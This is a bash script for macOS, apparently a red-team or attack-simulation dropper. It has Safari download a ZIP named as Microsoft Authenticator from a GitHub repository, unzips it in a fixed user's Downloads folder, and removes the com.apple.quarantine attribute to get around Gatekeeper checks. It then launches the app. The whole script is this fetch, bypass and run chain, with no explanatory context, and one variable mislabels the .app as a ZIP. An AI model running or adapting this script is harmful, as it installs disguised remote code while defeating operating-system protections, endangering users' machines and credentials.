#!/bin/bash

# URL to open in Safari
url="https://github.com/CYBTWR-TAMUTO/M365DShared/raw/main/MicrosoftAuthenticator.app.zip"

# Create an AppleScript command
applescript_command='tell application "Safari" to open location "'"$url"'"'

# Execute the AppleScript command
osascript -e "$applescript_command"

# Sleep for a moment to allow time for download
sleep 10

# Specify the name of the downloaded ZIP file
# app!!
zip_file_name="MicrosoftAuthenticator.app"

# Specify the full path to the downloaded ZIP file
zip_file_path="/Users/luiza/Downloads/$zip_file_name"

# Check if the downloaded ZIP file exists
if [ -e "$zip_file_path" ]; then
    echo "Downloaded ZIP file found."

    # Specify the name of the extracted application
    app_name="MicrosoftAuthenticator.app"

    # Specify the full path to the extracted application
    app_path="/Users/luiza/Downloads/$app_name"

    # Unzip the file
    echo "Extracting the ZIP file..."
    unzip -o "$zip_file_path" -d "/Users/luiza/Downloads/"

    # Check extended attributes for MicrosoftAuthenticator.app
    echo "Checking extended attributes for $app_name..."
    xattr_result=$(xattr "$app_path")

    # Check if "com.apple.quarantine" is present in the extended attributes
    if [[ $xattr_result == *"com.apple.quarantine"* ]]; then
        echo "The 'com.apple.quarantine' attribute is present."
        
        # Removing 'com.apple.quarantine' attribute
        echo "Removing 'com.apple.quarantine' attribute..."
        xattr -d com.apple.quarantine "$app_path"
        echo "Attribute removed."
    else
        echo "No 'com.apple.quarantine' attribute found."
    fi

    # Run the unzipped app 
    echo "Opening the application..."
    open "$app_path"
else
    echo "Error: Downloaded ZIP file not found."
fi
